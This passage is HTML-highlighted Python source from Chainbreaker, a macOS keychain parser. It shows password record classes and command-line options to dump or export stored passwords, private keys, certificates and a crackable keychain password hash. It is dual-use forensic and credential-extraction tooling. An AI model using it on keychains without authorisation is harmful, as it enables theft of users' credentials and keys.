</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">KeyError</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Protocol Type: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>ProtocolType
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Auth Type: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> AUTH_TYPE[self<span style="color:#f92672">.</span>AuthType]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">KeyError</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Auth Type: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>AuthType
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Port: </span><span style="color:#e6db74">%d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>Port
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Path: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>Path
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> self<span style="color:#f92672">.</span>get_password_output_str()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> output
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">AppleshareRecord</span>(SSGBEncryptedRecord):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> __init__(self, created<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, last_modified<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, description<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, comment<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, creator<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, type<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                     print_name<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, alias<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, protected<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, account<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, volume<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, server<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                     protocol_type<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, address<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, signature<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, dbkey<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, ssgp<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Created <span style="color:#f92672">=</span> created
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>LastModified <span style="color:#f92672">=</span> last_modified
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Description <span style="color:#f92672">=</span> description
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Comment <span style="color:#f92672">=</span> comment
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Creator <span style="color:#f92672">=</span> creator
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Type <span style="color:#f92672">=</span> type
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>PrintName <span style="color:#f92672">=</span> print_name
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Alias <span style="color:#f92672">=</span> alias
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Protected <span style="color:#f92672">=</span> protected
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Account <span style="color:#f92672">=</span> account
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Volume <span style="color:#f92672">=</span> volume
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Server <span style="color:#f92672">=</span> server
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Protocol_Type <span style="color:#f92672">=</span> protocol_type
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Address <span style="color:#f92672">=</span> address
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Signature <span style="color:#f92672">=</span> signature
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>SSGP <span style="color:#f92672">=</span> ssgp
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>DBKey <span style="color:#f92672">=</span> dbkey
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            Chainbreaker<span style="color:#f92672">.</span>SSGBEncryptedRecord<span style="color:#f92672">.</span>__init__(self)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> __str__(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;[+] AppleShare Record (no longer used in OS X)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Create DateTime: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>Created
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Last Modified DateTime: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>LastModified
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Description: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>Description
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Comment: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>Comment
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Creator: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>Creator
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Type: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>Type
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] PrintName: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>PrintName
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Alias: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>Alias
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Protected: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>Protected
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Account: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>Account
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Volume: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>Volume
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Server: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>Server
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Protocol Type: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> PROTOCOL_TYPE[self<span style="color:#f92672">.</span>Protocol_Type]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">KeyError</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Protocol Type: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>Protocol_Type
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Address: </span><span style="color:#e6db74">%d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>Address
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Signature: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>Signature
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> self<span style="color:#f92672">.</span>get_password_output_str()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> output
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">import</span> argparse
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">import</span> getpass
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">import</span> datetime
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">import</span> hashlib
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    arguments <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser(description<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Dump items stored in an OSX Keychain&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># General Arguments</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    arguments<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;keychain&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Location of the keychain file to parse&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Available actions</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dump_actions <span style="color:#f92672">=</span> arguments<span style="color:#f92672">.</span>add_argument_group(<span style="color:#e6db74">&#39;Dump Actions&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dump_actions<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;--dump-all&#39;</span>, <span style="color:#e6db74">&#39;-a&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Dump records to the console window.&#39;</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                              action<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;store_const&#39;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;dump_all&#39;</span>, const<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dump_actions<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;--dump-keychain-password-hash&#39;</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                              help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Dump the keychain password hash in a format suitable for hashcat or John The Ripper&#39;</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                              action<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;store_const&#39;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;dump_keychain_password_hash&#39;</span>, const<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dump_actions<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;--dump-generic-passwords&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Dump all generic passwords&#39;</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                              action<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;store_const&#39;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;dump_generic_passwords&#39;</span>, const<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dump_actions<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;--dump-internet-passwords&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Dump all internet passwords&#39;</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                              action<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;store_const&#39;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;dump_internet_passwords&#39;</span>, const<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dump_actions<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;--dump-appleshare-passwords&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Dump all appleshare passwords&#39;</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                              action<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;store_const&#39;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;dump_appleshare_passwords&#39;</span>, const<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dump_actions<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;--dump-private-keys&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Dump all private keys&#39;</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                              action<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;store_const&#39;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;dump_private_keys&#39;</span>, const<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dump_actions<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;--dump-public-keys&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Dump all public keys&#39;</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                              action<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;store_const&#39;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;dump_public_keys&#39;</span>, const<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dump_actions<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;--dump-x509-certificates&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Dump all X509 certificates&#39;</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                              action<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;store_const&#39;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;dump_x509_certificates&#39;</span>, const<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Export private keys, public keys, or x509 certificates to disk.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    export_actions <span style="color:#f92672">=</span> arguments<span style="color:#f92672">.</span>add_argument_group(<span style="color:#e6db74">&#39;Export Actions&#39;</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                                                  description<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Export records to files. Save location &#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                                                              <span style="color:#e6db74">&#39;is CWD, but can be overridden with --output / -o&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    export_actions<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;--export-keychain-password-hash&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Save the keychain password hash to disk&#39;</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                                action<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;store_const&#39;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;export_keychain_password_hash&#39;</span>, const<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    export_actions<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;--export-generic-passwords&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Save all generic passwords to disk&#39;</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                                action<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;store_const&#39;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;export_generic_passwords&#39;</span>, const<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    export_actions<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;--export-internet-passwords&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Save all internet passwords to disk&#39;</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                                action<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;store_const&#39;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;export_internet_passwords&#39;</span>, const<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    export_actions<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;--export-appleshare-passwords&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Save all appleshare passwords to disk&#39;</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                                action<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;store_const&#39;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;export_appleshare_passwords&#39;</span>, const<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    export_actions<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;--export-private-keys&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Save private keys to disk&#39;</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                                action<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;store_const&#39;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;export_private_keys&#39;</span>, const<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    export_actions<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;--export-public-keys&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Save public keys to disk&#39;</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                                action<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;store_const&#39;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;export_public_keys&#39;</span>, const<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    export_actions<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;--export-x509-certificates&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Save X509 certificates to disk&#39;</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                                action<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;store_const&#39;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;export_x509_certificates&#39;</span>, const<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    export_actions<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;--export-all&#39;</span>, <span style="color:#e6db74">&#39;-e&#39;</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                                help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Save records to disk&#39;</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                                action<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;store_const&#39;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;export_all&#39;</span>, const<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    misc_actions <span style="color:#f92672">=</span> arguments<span style="color:#f92672">.</span>add_argument_group(<span style="color:#e6db74">&#39;Misc. Actions&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    misc_actions<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;--check-unlock-options&#39;</span>, <span style="color:#e6db74">&#39;-c&#39;</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                              help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Only check to see if the provided unlock options work.&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                                   <span style="color:#e6db74">&#39; Exits 0 on success, 1 on failure.&#39;</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                              action<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;store_const&#39;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;check_unlock&#39;</span>, const<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Keychain Unlocking Arguments</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    unlock_args <span style="color:#f92672">=</span> arguments<span style="color:#f92672">.</span>add_argument_group(<span style="color:#e6db74">&#39;Unlock Options&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    unlock_args<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;--password-prompt&#39;</span>, <span style="color:#e6db74">&#39;-p&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Prompt for a password to use in unlocking the keychain&#39;</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                             action<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;store_const&#39;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;password_prompt&#39;</span>, const<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    unlock_args<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;--password&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Unlock the keychain with a password, provided on the terminal.&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                                                <span style="color:#e6db74">&#39;Caution: This is insecure and you should likely use&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                                                <span style="color:#e6db74">&#39;--password-prompt instead&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    unlock_args<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;--key-prompt&#39;</span>, <span style="color:#e6db74">&#39;-k&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Prompt for a key to use in unlocking the keychain&#39;</span>,
</span></span><span style="display:flex;"><span>
